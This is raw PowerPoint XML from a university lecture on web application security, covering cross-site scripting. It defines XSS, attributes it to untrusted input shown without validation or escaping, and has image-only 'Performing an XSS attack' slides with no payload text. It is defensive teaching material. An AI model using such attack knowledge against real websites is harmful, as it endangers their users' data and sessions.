      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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62050" y="557529"/>
            <a:ext cx="6816725" cy="57404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130"/>
              <a:t>CROSS-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-254"/>
              <a:t>SITE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-114"/>
              <a:t>SCRIPTING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-15"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-140"/>
              <a:t>(XSS)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962050" y="1533220"/>
            <a:ext cx="10154285" cy="3011805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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aim</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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at</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>injecting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-50" b="1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malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>client-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side</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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into</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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otherwise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	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trusted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-15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websites</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="276860" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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exploits</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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flaws</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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app</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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send</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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client-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	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side</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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other</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>users</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="144780" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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flaws</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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enable</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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such</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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occur</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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when</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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app</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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displays 	untrusted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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(e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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coming</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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users)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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without</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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proper</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>validation </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>escaping</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-35" b="1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(encoding)</a:t>
            </a:r>
            <a:endParaRPr sz="2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30"/>
              <a:t>PERFORMING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="204"/>
              <a:t>AN</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-114"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>ATTACK</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="872871" y="1555559"/>
            <a:ext cx="10400665" cy="4649470"/>
            <a:chOff x="872871" y="1555559"/>
            <a:chExt cx="10400665" cy="4649470"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="object 4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82396" y="1565148"/>
              <a:ext cx="6443472" cy="2639568"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="object 5" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="877633" y="1560322"/>
              <a:ext cx="6453505" cy="2649220"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6453505" h="2649220">
                  <a:moveTo>
                    <a:pt x="0" y="2649092"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6452997" y="2649092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6452997" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2649092"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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6" name="object 6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820411" y="3557016"/>
              <a:ext cx="6443472" cy="2638044"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="object 7" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4815712" y="3552253"/>
              <a:ext cx="6453505" cy="2647950"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6453505" h="2647950">
                  <a:moveTo>
                    <a:pt x="0" y="2647569"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6452996" y="2647569"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6452996" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2647569"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9524">
              <a:solidFill>
                <a:srgbClr val="111F35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8" name="object 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376170" y="2597061"/>
              <a:ext cx="723138" cy="723226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8337588" y="5176809"/>
              <a:ext cx="569810" cy="569902"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="object 10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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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30"/>
              <a:t>PERFORMING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="204"/>
              <a:t>AN</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-114"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>ATTACK</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="872871" y="1555559"/>
            <a:ext cx="10446385" cy="4631055"/>
            <a:chOff x="872871" y="1555559"/>
            <a:chExt cx="10446385" cy="4631055"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="object 4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82396" y="1565148"/>
              <a:ext cx="6443472" cy="2639568"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="object 5" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="877633" y="1560322"/>
              <a:ext cx="6453505" cy="2649220"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6453505" h="2649220">
                  <a:moveTo>
                    <a:pt x="0" y="2649092"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6452997" y="2649092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6452997" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2649092"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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6" name="object 6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866131" y="3538727"/>
              <a:ext cx="6443471" cy="2638044"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="object 7" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4861433" y="3533965"/>
              <a:ext cx="6453505" cy="2647950"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6453505" h="2647950">
                  <a:moveTo>
                    <a:pt x="0" y="2647569"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6452997" y="2647569"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6452997" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2647569"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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8" name="object 8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565392" y="4831080"/>
              <a:ext cx="1947672" cy="731519"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="object 9" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6565392" y="5020056"/>
              <a:ext cx="2641600" cy="848994"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2641600" h="848995">
                  <a:moveTo>
                    <a:pt x="2641092" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="848868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641092" y="848868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="264109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0" name="object 10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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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40"/>
              <a:t>XSS:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-204"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>CONSEQUENCES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3" descr="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240029" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="95"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Injected</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>client-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>side</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-15"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>executed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>browser</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>it</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>were</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="241300">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>trusted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70" b="1">
